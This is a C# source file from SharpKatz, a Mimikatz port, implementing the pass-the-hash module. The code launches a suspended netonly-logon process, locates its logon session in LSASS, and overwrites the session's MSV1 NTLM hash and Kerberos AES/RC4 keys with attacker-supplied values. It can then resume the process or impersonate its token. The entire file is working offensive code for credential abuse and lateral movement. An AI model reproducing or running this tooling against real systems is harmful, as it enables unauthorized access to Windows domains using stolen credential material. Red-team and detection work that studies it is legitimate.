//
// Author: B4rtik (@b4rtik)
// Project: SharpKatz (https://github.com/b4rtik/SharpKatz)
// License: BSD 3-Clause
//

using SharpKatz.Credential;
using System;
using System.Collections.Generic;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text;
using static SharpKatz.Module.Kerberos;
using static SharpKatz.Win32.Natives;

namespace SharpKatz.Module
{
    class Pth
    {
        public const int AES_128_KEY_LENGTH = 16;
        public const int AES_256_KEY_LENGTH = 32;

        

        /*[StructLayout(LayoutKind.Sequential)]
        public struct SEKURLSA_PTH_DATA
        {
            public IntPtr LogonId;//LUID
            public IntPtr NtlmHash;//BYTE
            public IntPtr Aes256Key;//BYTE
            public IntPtr Aes128Key;//BYTE
            public bool isReplaceOk;
        }*/

        public static int CreateProcess(IntPtr hProcess, IntPtr lsasrvMem, IntPtr kerberos, OSVersionHelper oshelper, byte[] iv, byte[] aeskey, byte[] deskey, string user, string domain, string ntlmHash = null, string aes128 = null, string aes256 = null, string rc4 = null, string binary = "cmd.exe", string arguments = "", string luid = null, bool impersonate = false)
        {
            TOKEN_STATISTICS tokenStats = new TOKEN_STATISTICS();
            string lcommand = string.Empty;
            byte[] aes128bytes = null;
            byte[] aes256bytes = null;
            SEKURLSA_PTH_DATA data = new SEKURLSA_PTH_DATA();
            byte[] ntlmHashbytes = null;
            string lntlmhash = string.Empty;

            if (!string.IsNullOrEmpty(luid))
            {
                tokenStats.AuthenticationId.HighPart = 0;
                tokenStats.AuthenticationId.LowPart = uint.Parse(luid);
                data.LogonId = tokenStats.AuthenticationId;
            }
            else
            {
                if (string.IsNullOrEmpty(user))
                {
                    Console.WriteLine("[x] Missing required parameter user");
                    return 1;
                }

                if (string.IsNullOrEmpty(domain))
                {
                    Console.WriteLine("[x] Missing required parameter domain");
                    return 1;
                }

                if (impersonate)
                    lcommand = Assembly.GetExecutingAssembly().CodeBase;
                else
                    lcommand = binary;

                Console.WriteLine("[*] user\t: {0}", user);
                Console.WriteLine("[*] domain\t: {0}", domain);
                Console.WriteLine("[*] program\t: {0}", lcommand);
                Console.WriteLine("[*] impers.\t: {0}", impersonate);
            }

            try
            {
                if (!string.IsNullOrEmpty(aes128))
                {
                    aes128bytes = Utility.StringToByteArray(aes128);

                    if (aes128bytes.Length != AES_128_KEY_LENGTH)
                        throw new System.ArgumentException();

                    data.Aes128Key = aes128bytes;

                    Console.WriteLine("[*] AES128\t: {0}", Utility.PrintHexBytes(aes128bytes));
                }

                
            }
            catch (Exception)
            {
                Console.WriteLine("[x] Invalid aes128 key");
                return 1;
            }
                        
            try
            {
                if (!string.IsNullOrEmpty(aes256))
                {
                    aes256bytes = Utility.StringToByteArray(aes256);

                    if (aes256bytes.Length != AES_256_KEY_LENGTH)
                        throw new System.ArgumentException();

                    data.Aes256Key = aes256bytes;

                    Console.WriteLine("[*] AES256\t: {0}", Utility.PrintHexBytes(aes256bytes));
                }

                
            }
            catch (Exception)
            {
                Console.WriteLine("[x] Invalid aes128 key");
                return 1;
            }

            try
            {
                if (!string.IsNullOrEmpty(rc4))
                    ntlmHashbytes = Utility.StringToByteArray(rc4);

                if (!string.IsNullOrEmpty(ntlmHash))
                    ntlmHashbytes = Utility.StringToByteArray(ntlmHash);

                if (ntlmHashbytes.Length != Msv1.LM_NTLM_HASH_LENGTH)
                    throw new System.ArgumentException();

                data.NtlmHash = ntlmHashbytes;

                Console.WriteLine("[*] NTLM\t: {0}", Utility.PrintHashBytes(ntlmHashbytes));
            }
            catch (Exception)
            {
                Console.WriteLine("[x] Invalid Ntlm hash/rc4 key");
                return 1;
            }

            if(data.NtlmHash != null || data.Aes128Key != null || data.Aes256Key != null)
            {
                if (!string.IsNullOrEmpty(luid))
                {
                    Console.WriteLine("[*] mode\t: replacing NTLM/RC4 key in a session");
                    Pth_luid(hProcess, lsasrvMem, kerberos, oshelper, iv, aeskey, deskey, ref data);
                }
                else if(!string.IsNullOrEmpty(user))
                {
                    PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
                    if(CreateProcessWithLogonW(user, "", domain, @"C:\Windows\System32\", binary, arguments, CreationFlags.CREATE_SUSPENDED, ref pi))
                    {
                        Console.WriteLine("[*]  | PID {0}", pi.dwProcessId);
                        Console.WriteLine("[*]  | TID {0}", pi.dwThreadId);

                        IntPtr hToken = IntPtr.Zero;

                        if (OpenProcessToken(pi.hProcess, TOKEN_READ | (impersonate ? TOKEN_DUPLICATE : 0), out hToken))
                        {

                            IntPtr hTokenInformation = Marshal.AllocHGlobal(Marshal.SizeOf(tokenStats));
                            Marshal.StructureToPtr(tokenStats, hTokenInformation, false);

                            uint retlen = 0;

                            if (GetTokenInformation(hToken, TOKEN_INFORMATION_CLASS.TokenStatistics, hTokenInformation, (uint)Marshal.SizeOf(tokenStats),out retlen))
                            {
                                tokenStats = (TOKEN_STATISTICS)Marshal.PtrToStructure(hTokenInformation, typeof(TOKEN_STATISTICS));
                                data.LogonId = tokenStats.AuthenticationId;

                                Pth_luid(hProcess, lsasrvMem, kerberos, oshelper, iv, aeskey, deskey, ref data);

                                if (data.isReplaceOk)
                                {
                                    if (impersonate)
                                    {
                                        SECURITY_ATTRIBUTES at = new SECURITY_ATTRIBUTES();
                                        IntPtr hNewToken = IntPtr.Zero;
                                        if (DuplicateTokenEx(hToken, TOKEN_QUERY | TOKEN_IMPERSONATE, ref at, (int)SECURITY_IMPERSONATION_LEVEL.SecurityDelegation, (int)TOKEN_TYPE.TokenImpersonation, ref hNewToken))
                                        {
                                            if (SetThreadToken(IntPtr.Zero, hNewToken))
                                                Console.WriteLine("[*] ** Token Impersonation **");
                                            else
                                            {
                                                Console.WriteLine("[x] Error SetThreadToken");
                                                return 1;
                                            }
                                            CloseHandle(hNewToken);
                                        }
                                        else
                                        {
                                            Console.WriteLine("[x] Error DuplicateTokenEx");
                                            return 1;
                                        }

                                        NtTerminateProcess(pi.hProcess, (uint)NTSTATUS.Success);
                                    }
                                    else
                                        NtResumeProcess(pi.hProcess);
                                }
                                else
                                    NtTerminateProcess(pi.hProcess, (uint)NTSTATUS.ProcessIsTerminating);

                            }
                            else
                            {
                                Console.WriteLine("[x] Error GetTokenInformazion");
                                return 1;
                            }
                        }
                        else
                        {
                            Console.WriteLine("[x] Error open process");
                            return 1;
                        }
                    }
                    else
                    {
                        Console.WriteLine("[x] Error process create");
                        return 1;
                    }
                }
                else
                {
                    Console.WriteLine("[x] Bad user or LUID");
                    return 1;
                }
            }
            else
            {
                Console.WriteLine("[x] Missing at least one argument : ntlm/rc4 OR aes128 OR aes256");
                return 1;
            }

            return 0;
        }

        private static void Pth_luid(IntPtr hProcess, IntPtr lsasrvMem, IntPtr kerberos, OSVersionHelper oshelper, byte[] iv, byte[] aeskey, byte[] deskey, ref SEKURLSA_PTH_DATA data)
        {

            List<Logon> logonlist = new List<Logon>();
            Module.LogonSessions.FindCredentials(hProcess, lsasrvMem, oshelper, iv, aeskey, deskey, logonlist);

            Console.WriteLine("[*]  |  LUID {0} ; {1} ({2:X}:{3:X})", data.LogonId.HighPart, data.LogonId.LowPart, data.LogonId.HighPart, data.LogonId.LowPart);

            Module.Msv1.WriteMsvCredentials(hProcess, oshelper, iv, aeskey, deskey, logonlist, ref data);

            List<KerberosLogonItem> klogonlist = Module.Kerberos.FindCredentials(hProcess, kerberos, oshelper, iv, aeskey, deskey, logonlist);

            foreach (KerberosLogonItem s in klogonlist)
            {
               Module.Kerberos.WriteKerberosKeys(ref hProcess, s, oshelper, iv, aeskey, deskey, ref data);
            }
            
            Console.WriteLine("[*]");
        }

        public static bool CreateProcessWithLogonW(string username, string password, string domain, string path, string binary, string arguments, CreationFlags cf, ref PROCESS_INFORMATION processInformation)
        {

            STARTUPINFO startupInfo = new STARTUPINFO();
            startupInfo.cb = (uint)Marshal.SizeOf(typeof(STARTUPINFO));

            processInformation = new PROCESS_INFORMATION();

            if (!Win32.Natives.CreateProcessWithLogonW(username, domain, password,
                LogonFlags.NetCredentialsOnly, path + binary, path + binary + " " + arguments, cf, 0, path, ref startupInfo, out processInformation))
            {
                return false;
            }

            return true;
        }



        public class SEKURLSA_PTH_DATA
        {
            public LUID LogonId { get; set; }
            public byte[] NtlmHash { get; set; }
            public byte[] Aes256Key { get; set; }
            public byte[] Aes128Key { get; set; }
            public bool isReplaceOk;
        }
    }

    
}
